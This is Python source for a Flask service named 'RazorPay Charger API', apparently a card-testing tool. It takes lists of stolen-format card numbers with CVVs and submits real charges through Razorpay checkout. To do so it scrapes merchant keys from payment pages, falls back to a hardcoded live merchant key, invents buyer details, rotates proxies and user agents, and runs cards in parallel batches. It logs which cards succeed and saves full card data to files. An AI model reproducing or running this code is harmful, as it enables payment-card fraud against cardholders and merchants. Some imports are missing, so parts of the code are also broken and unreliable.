#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
RazorPay Charger API 
"""

import re
import json
import time
import uuid
import random
import string
import sys
import os
import csv
import threading
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeoutError
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import logging

# Install missing packages
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system('pip install playwright')
    os.system('playwright install chromium')
    from playwright.sync_api import sync_playwright

try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install beautifulsoup4')
    from bs4 import BeautifulSoup


app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


PARALLEL_WORKERS = 10
PARALLEL_TIMEOUT = 60

_executor = ThreadPoolExecutor(max_workers=PARALLEL_WORKERS)
_active_requests = 0
_request_lock = threading.Lock()

USD_TO_INR_RATE = 83.50
USD_TO_USDT_RATE = 1.0

CURRENCY_RATES = {
    'USD': 1.0,
    'INR': USD_TO_INR_RATE,
    'USDT': USD_TO_USDT_RATE
}

ALLOWED_CURRENCIES = ['USD', 'INR', 'USDT']
AMOUNT_MIN = 1
AMOUNT_MAX = 100

DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."

FALLBACK_MERCHANT = {
    'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
    'key_id': 'rzp_live_hrgl3RDoNMvCOs',
    'payment_link_id': 'pl_OzLkvRvf1drPps',
    'payment_page_item_id': 'ppi_OzLkvUeMxfhIbI'
}


class ProxyManager:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.current_index = 0
        self.lock = threading.Lock()
        self.failed_proxies = set()
    
    def load_from_file(self, filename="proxies.txt"):
        try:
            with open(filename, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(self.proxies)} proxies from file")
            return True
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
            return False
    
    def load_from_string(self, proxy_string):
        self.proxies = [p.strip() for p in proxy_string.split(',') if p.strip()]
        logger.info(f"Loaded {len(self.proxies)} proxies from string")
        return True
    
    def get_next(self):
        if not self.proxies:
            return None
        with self.lock:
            # Try to find a working proxy
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.current_index % len(self.proxies)]
                self.current_index += 1
                if proxy not in self.failed_proxies:
                    return proxy
                attempts += 1
            # If all proxies failed, reset and try again
            self.failed_proxies.clear()
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy
    
    def mark_failed(self, proxy):
        with self.lock:
            self.failed_proxies.add(proxy)
    
    def get_playwright_proxy(self):
        proxy_str = self.get_next()
        if not proxy_str:
            return None
        
        parts = proxy_str.split(':')
        if len(parts) == 4:
            ip, port, username, password = [p.strip() for p in parts]
            return {
                "server": f"http://{ip}:{port}",
                "username": username,
                "password": password
            }
        elif len(parts) == 2:
            ip, port = [p.strip() for p in parts]
            return {"server": f"http://{ip}:{port}"}
        elif len(parts) == 3:
            ip, port, username = [p.strip() for p in parts]
            return {
                "server": f"http://{ip}:{port}",
                "username": username,
                "password": ""
            }
        return None

class FingerprintGenerator:
    @staticmethod
    def generate_muid():
        return hashlib.md5(f"{time.time()}{random.random()}{os.urandom(8)}".encode()).hexdigest()[:16]
    
    @staticmethod
    def generate_sid():
        return hashlib.md5(f"{random.randint(100000, 999999)}{time.time()}".encode()).hexdigest()[:16]
    
    @staticmethod
    def generate_guid():
        return str(uuid.uuid4())
    
    @staticmethod
    def get_user_agent():
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ]
        return random.choice(agents)
    
    @staticmethod
    def generate_fingerprint():
        return {
            'muid': FingerprintGenerator.generate_muid(),
            'sid': FingerprintGenerator.generate_sid(),
            'guid': FingerprintGenerator.generate_guid(),
            'user_agent': FingerprintGenerator.get_user_agent()
        }


def get_timestamp():
    return datetime.now().strftime("%H:%M:%S")

def get_full_timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def generate_random_user_info():
    first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 'James', 'Lisa', 'Robert', 'Maria']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    
    return {
        "name": f"{random.choice(first_names)} {random.choice(last_names)}",
        "email": f"user{random.randint(100, 9999)}@gmail.com",
        "phone": f"9876543{random.randint(100, 999)}",
        "address": f"{random.randint(1, 999)} {random.choice(['Main St', 'Park Ave', 'Oak Rd', 'Maple Dr', 'Cedar Ln'])}",
        "city": random.choice(['Mumbai', 'Delhi', 'Bangalore', 'Chennai', 'Hyderabad']),
        "state": random.choice(['Maharashtra', 'Delhi', 'Karnataka', 'Tamil Nadu', 'Telangana']),
        "zip": str(random.randint(100000, 999999))
    }

def convert_currency(amount, from_currency='USD', to_currency='INR'):
    if from_currency == to_currency:
        return amount
    if from_currency == 'INR':
        usd_amount = amount / USD_TO_INR_RATE
    elif from_currency == 'USDT':
        usd_amount = amount * USD_TO_USDT_RATE
    else:
        usd_amount = amount
    if to_currency == 'INR':
        return round(usd_amount * USD_TO_INR_RATE, 2)
    elif to_currency == 'USDT':
        return round(usd_amount, 2)
    else:
        return round(usd_amount, 2)

def inr_to_paise(inr_amount):
    return int(inr_amount * 100)

def get_masked_card(card_number):
    if len(card_number) >= 10:
        return f"{card_number[:6]}******{card_number[-4:]}"
    return card_number

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip().replace(" ", ""),
        'mes': parts[1].strip().zfill(2),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        ip, port = parts
        return {"server": f"http://{ip}:{port}"}
    elif len(parts) == 4:
        ip, port, user, password = parts
        return {
            "server": f"http://{ip}:{port}",
            "username": user,
            "password": password
        }
    elif len(parts) == 3:
        ip, port, user = parts
        return {
            "server": f"http://{ip}:{port}",
            "username": user,
            "password": ""
        }
    return None

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r'(PAYMENT_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'(3DS_[A-Z_]+)',
        r'(AUTH_[A-Z_]+)',
        r'(DECLINE_[A-Z_]+)',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                return match.strip("{}:'\" ")
    return message[:50]

def save_results_to_file(results, filename=None):
    if not results:
        return
    if not filename:
        timestamp = get_full_timestamp()
        filename = f"razorpay_results_{timestamp}"
    
    json_file = f"{filename}.json"
    with open(json_file, 'w') as f:
        json.dump(results, f, indent=2)
    logger.info(f"Results saved to {json_file}")
    
    csv_file = f"{filename}.csv"
    with open(csv_file, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Card', 'Month', 'Year', 'CVV', 'Status', 'Amount_USD', 'Amount_INR', 'Payment_ID', 'Order_ID', 'Time', 'Timestamp'])
        for r in results:
            writer.writerow([
                r.get('card', ''), r.get('month', ''), r.get('year', ''),
                r.get('cvv', ''), r.get('status', ''), r.get('amount_usd', ''),
                r.get('amount_inr', ''), r.get('payment_id', ''), r.get('order_id', ''),
                r.get('time', ''), r.get('timestamp', '')
            ])
    logger.info(f"Results saved to {csv_file}")


_shared_playwright = None
_shared_browser = None
_browser_lock = threading.Lock()

def get_shared_browser(proxy_config=None):
    global _shared_playwright, _shared_browser
    with _browser_lock:
        if _shared_browser is None or not _shared_browser.is_connected():
            try:
                if _shared_browser:
                    _shared_browser.close()
            except Exception:
                pass
            try:
                if _shared_playwright:
                    _shared_playwright.stop()
            except Exception:
                pass
            _shared_playwright = sync_playwright().start()
            _shared_browser = _shared_playwright.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            )
        return _shared_browser

def close_shared_browser():
    global _shared_playwright, _shared_browser
    with _browser_lock:
        try:
            if _shared_browser:
                _shared_browser.close()
        except Exception:
            pass
        try:
            if _shared_playwright:
                _shared_playwright.stop()
        except Exception:
            pass
        _shared_browser = None
        _shared_playwright = None



def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', proxy_str=None, proxy_manager=None):
    
    start_time = time.time()
    result = {
        'success': False,
        'card': cc,
        'month': mes,
        'year': ano,
        'cvv': cvv,
        'masked': get_masked_card(cc),
        'amount_usd': 0,
        'amount_inr': 0,
        'currency': currency,
        'payment_id': None,
        'order_id': None,
        'status': 'unknown',
        'error': None,
        'time': 0,
        'gateway': 'RAZORPAY'
    }
    
    try:
        # 1. Parse card
        card_number = cc.replace(" ", "")
        exp_month = mes.zfill(2)
        exp_year = ano
        if len(exp_year) == 2:
            exp_year = f"20{exp_year}"
        
        # 2. Amount
        if amount == 'random':
            usd_amount = round(random.uniform(AMOUNT_MIN, AMOUNT_MAX), 2)
        else:
            usd_amount = float(amount)
            if usd_amount < AMOUNT_MIN or usd_amount > AMOUNT_MAX:
                result['error'] = f"Amount must be between {AMOUNT_MIN} and {AMOUNT_MAX} {currency}"
                result['time'] = round(time.time() - start_time, 2)
                return result
        
        result['amount_usd'] = round(usd_amount, 2)
        
        inr_amount = convert_currency(usd_amount, currency, 'INR')
        result['amount_inr'] = round(inr_amount, 2)
        amount_paise = inr_to_paise(inr_amount)
        
        # 3. Merchant data extraction
        proxy_config = parse_proxy(proxy_str) if proxy_str else None
        if proxy_manager and not proxy_config:
            proxy_config = proxy_manager.get_playwright_proxy()
        
        merchant_data = FALLBACK_MERCHANT
        merchant_source = "fallback"
        
        if site_url:
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True, proxy=proxy_config, args=['--no-sandbox'])
                    page = browser.new_page()
                    page.set_extra_http_headers({
                        'User-Agent': FingerprintGenerator.get_user_agent()
                    })
                    page.goto(site_url, timeout=45000, wait_until='networkidle')
                    
                    merchant_data = page.evaluate("""
                        () => {
                            // Check window.data
                            if (window.data && window.data.keyless_header) {
                                return {
                                    keyless_header: window.data.keyless_header,
                                    key_id: window.data.key_id,
                                    payment_link_id: window.data.payment_link ? window.data.payment_link.id : null,
                                    payment_page_item_id: window.data.payment_link && window.data.payment_link.payment_page_items ? 
                                        window.data.payment_link.payment_page_items[0]?.id : null
                                };
                            }
                            
                            // Check window.__INITIAL_STATE__
                            if (window.__INITIAL_STATE__) {
                                const state = window.__INITIAL_STATE__;
                                return {
                                    keyless_header: state.keyless_header,
                                    key_id: state.key_id,
                                    payment_link_id: state.payment_link?.id,
                                    payment_page_item_id: state.payment_link?.payment_page_items?.[0]?.id
                                };
                            }
                            
                            // Search in scripts
                            const scripts = document.querySelectorAll('script');
                            for (let script of scripts) {
                                const text = script.textContent;
                                if (text.includes('keyless_header')) {
                                    const match = text.match(/keyless_header["']?:\\s*["']([^"']+)["']/);
                                    if (match) return { keyless_header: match[1] };
                                }
                                if (text.includes('key_id')) {
                                    const match = text.match(/key_id["']?:\\s*["']([^"']+)["']/);
                                    if (match) return { key_id: match[1] };
                                }
                            }
                            
                            return null;
                        }
                    """)
                    browser.close()
                    
                    if merchant_data and merchant_data.get('keyless_header') and merchant_data.get('key_id'):
                        merchant_source = "dynamic"
                        logger.info(f"Merchant data extracted dynamically from {site_url}")
                    else:
                        merchant_data = FALLBACK_MERCHANT
                        logger.warning(f"Using fallback merchant data for {site_url}")
            except Exception as e:
                logger.warning(f"Merchant extraction failed: {e}")
                merchant_data = FALLBACK_MERCHANT
        
        keyless_header = merchant_data.get('keyless_header')
        key_id = merchant_data.get('key_id')
        payment_link_id = merchant_data.get('payment_link_id')
        payment_page_item_id = merchant_data.get('payment_page_item_id')
        
        if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
            result['error'] = 'Missing merchant data'
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        # 4. User info
        user_info = generate_random_user_info()
        
        # 5. Get browser
        browser = get_shared_browser(proxy_config)
        page = browser.new_page()
        page.set_extra_http_headers({
            'User-Agent': FingerprintGenerator.get_user_agent()
        })
        
        # 6. Get session token
        session_token = None
        try:
            page.goto(
                "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1",
                timeout=60000
            )
            page.wait_for_url("**/checkout/public*session_token*", timeout=55000)
            session_token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
        except Exception as e:
            page.close()
            result['error'] = f"Session token error: {str(e)[:100]}"
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        if not session_token:
            page.close()
            result['error'] = 'Failed to get session token'
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        # 7. Create order using in-browser fetch
        order_js = """
        async ([pl_id, ppi, amt]) => {
            try {
                const r = await fetch("https://api.razorpay.com/v1/payment_pages/" + pl_id + "/order", {
                    method: "POST",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        notes: {comment: ""},
                        line_items: [{payment_page_item_id: ppi, amount: amt}]
                    })
                });
                const d = await r.json();
                return d.order ? d.order.id : null;
            } catch(e) {
                return null;
            }
        }
        """
        order_id = page.evaluate(order_js, [payment_link_id, payment_page_item_id, amount_paise])
        
        if not order_id:
            page.close()
            result['error'] = 'Failed to create order'
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        result['order_id'] = order_id
        
        # 8. Submit payment using in-browser fetch
        submit_js = """
        async (args) => {
            const [k_id, sess_token, k_hdr, p_id, o_id, amt,
                   c_num, c_cvv, c_name, exp_m, exp_y, cnt, em, fp] = args;

            const params = new URLSearchParams();
            params.append("notes[comment]", "");
            params.append("payment_link_id", p_id);
            params.append("key_id", k_id);
            params.append("callback_url", "https://your-server.com/callback");
            params.append("contact", cnt);
            params.append("email", em);
            params.append("currency", "INR");
            params.append("_[library]", "checkoutjs");
            params.append("_[platform]", "browser");
            params.append("amount", String(amt));
            params.append("order_id", o_id);
            params.append("device_fingerprint[fingerprint_payload]", fp);
            params.append("method", "card");
            params.append("card[number]", c_num);
            params.append("card[cvv]", c_cvv);
            params.append("card[name]", c_name);
            params.append("card[expiry_month]", exp_m);
            params.append("card[expiry_year]", exp_y);
            params.append("save", "0");

            const qs = new URLSearchParams({
                key_id: k_id, session_token: sess_token, keyless_header: k_hdr
            });
            
            try {
                const r = await fetch(
                    "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?" + qs.toString(),
                    {
                        method: "POST",
                        headers: {
                            "x-session-token": sess_token,
                            "Content-Type": "application/x-www-form-urlencoded"
                        },
                        body: params.toString()
                    }
                );
                const text = await r.text();
                try { return {status: r.status, body: JSON.parse(text)}; }
                catch { return {status: r.status, body: text}; }
            } catch(e) {
                return {status: 0, body: "NETWORK_ERROR"};
            }
        }
        """
        
        submit_result = page.evaluate(submit_js, [
            key_id, session_token, keyless_header,
            payment_link_id, order_id, amount_paise,
            card_number, cvv, user_info["name"], exp_month, exp_year,
            f"+91{user_info['phone']}", user_info["email"], DEVICE_FINGERPRINT
        ])
        
        # 9. Parse result
        data = submit_result.get("body", {}) if isinstance(submit_result, dict) else {}
        
        payment_id = None
        if isinstance(data, dict):
            if "payment_id" in data:
                payment_id = data["payment_id"]
            elif "razorpay_payment_id" in data:
                payment_id = data["razorpay_payment_id"]
            elif "payment" in data and isinstance(data["payment"], dict):
                payment_id = data["payment"].get("id")
        
        if payment_id:
            result['payment_id'] = payment_id
        
        # 10. Handle response
        if isinstance(data, dict):
            # Handle 3DS redirect
            if data.get("redirect") == True or data.get("type") == "redirect":
                redirect_url = ""
                if isinstance(data.get("request"), dict):
                    redirect_url = data["request"].get("url", "")
                
                if redirect_url:
                    # Navigate to 3DS page
                    try:
                        page.goto(redirect_url, timeout=45000, wait_until='networkidle')
                        html_content = page.content()
                        
                        # Check for success signature
                        if 'razorpay_signature' in html_content:
                            result['success'] = True
                            result['status'] = 'payment_success'
                        else:
                            # Check payment status
                            status_check = page.evaluate("""
                                async ([pid, kid, st, kh]) => {
                                    try {
                                        const qs = new URLSearchParams({key_id: kid, session_token: st, keyless_header: kh});
                                        const r = await fetch("https://api.razorpay.com/v1/standard_checkout/payments/" + pid + "?" + qs.toString(), {
                                            headers: {"x-session-token": st}
                                        });
                                        if (r.ok) {
                                            const d = await r.json();
                                            return d.status || "unknown";
                                        }
                                        return "unknown";
                                    } catch(e) {
                                        return "unknown";
                                    }
                                }
                            """, [payment_id, key_id, session_token, keyless_header])
                            
                            if status_check in ('captured', 'authorized'):
                                result['success'] = True
                                result['status'] = 'payment_success'
                            elif status_check == 'pending':
                                result['success'] = True
                                result['status'] = '3ds_pending'
                            else:
                                result['status'] = '3ds_completed'
                                result['success'] = True
                    except Exception as e:
                        result['error'] = f"3DS handling error: {str(e)[:100]}"
                        result['status'] = '3ds_error'
                else:
                    result['status'] = '3ds_redirect'
                    result['success'] = True
            
            elif "razorpay_signature" in data or "signature" in data:
                result['success'] = True
                result['status'] = 'payment_success'
            
            elif "error" in data:
                err_obj = data.get("error", {})
                if isinstance(err_obj, dict):
                    result['error'] = err_obj.get('description', str(data))
                    result['status'] = 'payment_failed'
                else:
                    result['error'] = str(err_obj)
                    result['status'] = 'payment_failed'
            
            elif "status" in data and data["status"] in ('captured', 'authorized'):
                result['success'] = True
                result['status'] = 'payment_success'
            
            else:
                result['status'] = 'unknown'
                result['error'] = json.dumps(data)[:200]
        else:
            result['error'] = str(submit_result.get("body", ""))[:200]
            result['status'] = 'payment_failed'
        
        page.close()
        
        # 11. Final status check if payment was successful but we want to confirm
        if result['success'] and payment_id:
            try:
                # Verify payment status
                status_check_js = """
                async ([pid, kid, st, kh]) => {
                    try {
                        const qs = new URLSearchParams({key_id: kid, session_token: st, keyless_header: kh});
                        const r = await fetch("https://api.razorpay.com/v1/standard_checkout/payments/" + pid + "?" + qs.toString(), {
                            headers: {"x-session-token": st}
                        });
                        if (r.ok) {
                            const d = await r.json();
                            return d.status || "unknown";
                        }
                        return "unknown";
                    } catch(e) {
                        return "unknown";
                    }
                }
                """
                final_status = page.evaluate(status_check_js, [payment_id, key_id, session_token, keyless_header])
                if final_status in ('captured', 'authorized'):
                    result['success'] = True
                    result['status'] = 'payment_success'
                elif final_status == 'failed':
                    result['success'] = False
                    result['status'] = 'payment_failed'
                    result['error'] = 'Payment failed after verification'
            except:
                pass
        
        result['time'] = round(time.time() - start_time, 2)
        return result
        
    except Exception as e:
        result['error'] = str(e)[:200]
        result['status'] = 'error'
        result['time'] = round(time.time() - start_time, 2)
        # If browser is disconnected, force recreation on next call
        if 'is_connected' in str(e).lower() or 'target' in str(e).lower():
            close_shared_browser()
        return result

def charge_batch(cards, site_url, amount=5, currency='USD', max_workers=5, proxy_manager=None):
    results = []
    success_count = 0
    fail_count = 0
    completed = 0
    lock = threading.Lock()
    
    logger.info(f"Processing {len(cards)} cards with {max_workers} threads...")
    
    def process_card(card):
        nonlocal completed, success_count, fail_count
        try:
            parts = parse_cc_string(card)
            result = charge_razorpay_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'],
                site_url, amount, currency, None, proxy_manager
            )
            with lock:
                completed += 1
                if result.get('success'):
                    success_count += 1
                else:
                    fail_count += 1
                results.append(result)
            return result
        except Exception as e:
            with lock:
                completed += 1
                fail_count += 1
                results.append({
                    'success': False,
                    'card': card,
                    'error': str(e),
                    'status': 'error'
                })
            return None
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(process_card, card) for card in cards]
        for future in as_completed(futures):
            future.result()
    
    return {
        'total': len(cards),
        'success': success_count,
        'failed': fail_count,
        'results': results
    }


@app.route('/razorpay', methods=['GET'])
def razorpay_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        amount = request.args.get('amount', 5)
        currency = request.args.get('currency', 'USD')
        
        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        # Execute charge
        result = charge_razorpay_card(cc, mes, ano, cvv, site, amount, currency, proxy_str)
        
        response_data = {
            "Gateway": "RAZORPAY",
            "Price": result.get('amount_usd', 0),
            "Response": extract_clean_response(result.get('error', 'UNKNOWN')),
            "Status": result.get('success', False),
            "cc": cc_string,
            "payment_id": result.get('payment_id'),
            "order_id": result.get('order_id'),
            "amount_inr": result.get('amount_inr', 0),
            "time": result.get('time', 0)
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "RAZORPAY",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

@app.route('/razorpay_parallel', methods=['GET'])
def razorpay_checker_parallel():
    global _active_requests
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        amount = request.args.get('amount', 5)
        currency = request.args.get('currency', 'USD')
        
        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        with _request_lock:
            current_active = _active_requests
        
        while current_active >= PARALLEL_WORKERS:
            time.sleep(0.9)
            with _request_lock:
                current_active = _active_requests
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        with _request_lock:
            _active_requests += 1
        
        try:
            future = _executor.submit(
                charge_razorpay_card,
                cc, mes, ano, cvv, site, amount, currency, proxy_str
            )
            
            result = future.result(timeout=PARALLEL_TIMEOUT)
            
        except FuturesTimeoutError:
            return jsonify({
                "error": "Request timeout",
                "status": False,
                "Gateway": "RAZORPAY",
                "Price": 0.0,
                "Response": "TIMEOUT",
                "cc": cc_string
            }), 504
        except Exception as e:
            return jsonify({
                "error": str(e),
                "status": False,
                "Gateway": "RAZORPAY",
                "Price": 0.0,
                "Response": f"ERROR: {str(e)}",
                "cc": cc_string
            }), 500
        finally:
            with _request_lock:
                _active_requests -= 1
        
        response_data = {
            "Gateway": "RAZORPAY",
            "Price": result.get('amount_usd', 0),
            "Response": extract_clean_response(result.get('error', 'UNKNOWN')),
            "Status": result.get('success', False),
            "cc": cc_string,
            "masked": get_masked_card(cc),
            "payment_id": result.get('payment_id'),
            "order_id": result.get('order_id'),
            "amount_inr": result.get('amount_inr', 0),
            "time": result.get('time', 0),
            "parallel_mode": True,
            "active_requests": _active_requests
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "RAZORPAY",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500


@app.route('/razorpay_health', methods=['GET'])
def razorpay_health():
    return jsonify({
        "status": "online",
        "timestamp": get_full_timestamp(),
        "version": "2.0",
        "browser_status": "connected" if _shared_browser and _shared_browser.is_connected() else "disconnected"
    })

if __name__ == "__main__":
    import atexit
    atexit.register(close_shared_browser)
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)